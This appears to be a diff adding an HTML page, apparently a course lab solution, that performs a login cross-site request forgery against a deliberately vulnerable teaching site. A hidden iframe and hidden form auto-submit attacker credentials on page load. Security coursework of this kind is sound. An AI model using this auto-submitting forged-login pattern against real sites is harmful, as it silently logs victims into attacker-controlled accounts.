@@ -1,0 +1,21 @@
+<html>
+<head>
+<title>Definitely Bungle</title>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+</head>
+<body>
+  <iframe name="Z" src="http://bungle-cs461.csl.illinois.edu/?csrfdefense=0&xssdefense=5" width="900" height="600" style="display: none;"></iframe>
+<form target="Z" method="POST" action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=0&xssdefense=5">
+  <input id="username" type="hidden" name="username"></input>
+  <input id="password" type="hidden" name="password"></input>
+  <input id="go" type="submit" style="display: none;"></input>
+</form>
+<script>
+  $(document).ready(function() {
+    $("#username").val("attacker");
+    $("#password").val("l33th4x")
+    $("#go").click()
+  });
+</script>
+</body>
+</html>
